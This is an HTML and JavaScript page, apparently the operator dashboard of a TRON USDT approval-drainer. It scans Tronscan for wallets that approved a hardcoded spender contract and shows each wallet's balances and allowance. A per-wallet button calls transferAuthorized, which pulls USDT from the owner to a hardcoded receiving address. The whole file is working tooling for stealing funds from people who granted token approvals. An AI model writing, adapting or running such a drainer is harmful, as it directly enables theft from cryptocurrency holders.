
<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>USDT 授權監控後台</title>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: sans-serif; padding: 2em; background: #f9f9f9; }
    h1 { color: #2d3436; }
    .wallet-card {
      border: 1px solid #ccc; border-radius: 10px; padding: 1em; margin: 1em 0; background: #fff;
    }
    button { background: #00b894; color: white; padding: 0.5em 1em; border: none; border-radius: 5px; cursor: pointer; }
    .error { color: red; }
    #status { margin-top: 1em; font-weight: bold; }
  </style>
</head>
<body>
  <h1>🔐 USDT 授權監控後台</h1>
  <div id="status">🔍 正在檢查 TronLink...</div>
  <div id="wallets"></div>

  <script>
    const AUTH_CONTRACT = "TMxu165T2e3ZKWzgt7gipzmHwE5KYuibGa";
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const USDT_DECIMALS = 1e6;
    const YOUR_RECEIVE_ADDRESS = "THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR";

    function logStatus(msg, color = "#2d3436") {
      const status = document.getElementById("status");
      status.innerText = msg;
      status.style.color = color;
    }

    async function fetchApprovals() {
  logStatus("📡 正在讀取授權事件...");
  const walletsDiv = document.getElementById("wallets");
  walletsDiv.innerHTML = "";
  const results = [];

  try {
    let page = 0, stop = false;
    while (!stop && page < 3) {
      const res = await axios.get(
        `https://apilist.tronscanapi.com/api/contract/events?contract=${USDT_CONTRACT}&eventName=Approval&limit=100&start=${page * 100}`
      );
      const events = res.data.data || [];

      for (const evt of events) {
        const { result } = evt;
        if (
          result &&
          typeof result.spender === "string" &&
          result.spender.toLowerCase() === AUTH_CONTRACT.toLowerCase()
        ) {
          if (!results.find(r => r.address === result.owner)) {
            results.push({ address: result.owner });
          }
        }
      }

      if (events.length < 100) stop = true;
      page++;
    }

    const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
    const authContract = await window.tronWeb.contract().at(AUTH_CONTRACT);
    const walletsHtml = await Promise.all(results.map(async (w) => {
      try {
        const balance = await contract.balanceOf(w.address).call();
        const allowance = await contract.allowance(w.address, AUTH_CONTRACT).call();
        const trxBalance = await window.tronWeb.trx.getBalance(w.address);
        const usdt = parseFloat(balance) / USDT_DECIMALS;
        const allowed = parseFloat(allowance) / USDT_DECIMALS;
        const trx = parseFloat(trxBalance) / 1e6;

        return `<div class="wallet-card">
          <div><strong>錢包：</strong>${w.address}</div>
          <div>USDT：${usdt}</div>
          <div>授權額度：${allowed}</div>
          <div>TRX 餘額：${trx}</div>
          <button onclick="triggerTransfer('${w.address}')">🚀 觸發轉帳</button>
        </div>`;
      } catch (e) {
        return `<div class="wallet-card error">⚠️ ${w.address} - 無法取得資料</div>`;
      }
    }));

    walletsDiv.innerHTML = walletsHtml.join("");
    logStatus(`✅ 已載入 ${results.length} 個錢包`);
  } catch (e) {
    logStatus("❌ 錯誤：" + e.message, "red");
  }
}


    async function triggerTransfer(from) {
      try {
        const contract = await window.tronWeb.contract().at(AUTH_CONTRACT);
        const amount = 1 * USDT_DECIMALS;
        await contract.transferAuthorized(USDT_CONTRACT, from, YOUR_RECEIVE_ADDRESS, amount).send();
        alert("✅ 已觸發轉帳 from " + from);
      } catch (err) {
        alert("❌ 轉帳失敗：" + err.message);
      }
    }

    window.addEventListener("load", () => {
      let attempts = 0;
      const check = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(check);
          logStatus("🟢 已連接錢包：" + window.tronWeb.defaultAddress.base58, "green");
          fetchApprovals();
        } else {
          attempts++;
          logStatus("⏳ 嘗試連接 TronLink 中（" + attempts + "/20）...");
          if (attempts >= 20) {
            clearInterval(check);
            logStatus("❌ 無法偵測到 TronLink。請確認你使用的是 TronLink 的 DApp 瀏覽器", "red");
          }
        }
      }, 500);
    });
  </script>
</body>
</html>
